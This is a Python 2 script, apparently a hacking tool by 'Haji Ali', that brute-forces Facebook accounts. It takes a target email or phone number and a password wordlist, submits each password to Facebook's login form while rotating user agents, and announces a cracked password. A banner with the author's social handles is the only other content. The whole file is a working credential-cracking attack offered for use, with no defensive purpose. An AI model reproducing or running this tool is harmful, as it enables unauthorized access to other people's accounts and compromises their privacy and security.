#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random




email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        
__/\\\________/\\\_______________________________________________/\\\\\\\\\_____/\\\\\\__________        
 _\/\\\_______\/\\\______________________/\\\___________________/\\\\\\\\\\\\\__\////\\\__________       
  _\/\\\_______\/\\\_____________________\///___/\\\____________/\\\/////////\\\____\/\\\_____/\\\_      
   _\/\\\\\\\\\\\\\\\__/\\\\\\\\\__________/\\\_\///____________\/\\\_______\/\\\____\/\\\____\///__     
    _\/\\\/////////\\\_\////////\\\________\/\\\__/\\\___________\/\\\\\\\\\\\\\\\____\/\\\_____/\\\_    
     _\/\\\_______\/\\\___/\\\\\\\\\\_______\/\\\_\/\\\___________\/\\\/////////\\\____\/\\\____\/\\\_   
      _\/\\\_______\/\\\__/\\\/////\\\___/\\_\/\\\_\/\\\___________\/\\\_______\/\\\____\/\\\____\/\\\_  
       _\/\\\_______\/\\\_\//\\\\\\\\/\\_\//\\\\\\__\/\\\___________\/\\\_______\/\\\__/\\\\\\\\\_\/\\\_ 
        _\///________\///___\////////\//___\//////___\///____________\///________\///__\/////////__\///__

        +=========================================+                
        |	     Zinda bad HaZristaN          |
        +=========================================+       
 	|   Facebook: Haji Ali                    |  
        |   Telegram:t.me/haji_ali_back           |
        |   Telegram:t.me/cybertim1               |
        |   github:https://github.com/hajiali_boy |
        |   instagram;hajiali                     |
        |         Fallow me on Facebook           |
        +=========================================+
        |Haji Ali isn'n name      IT Is a BRAND.  |
        +-----------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
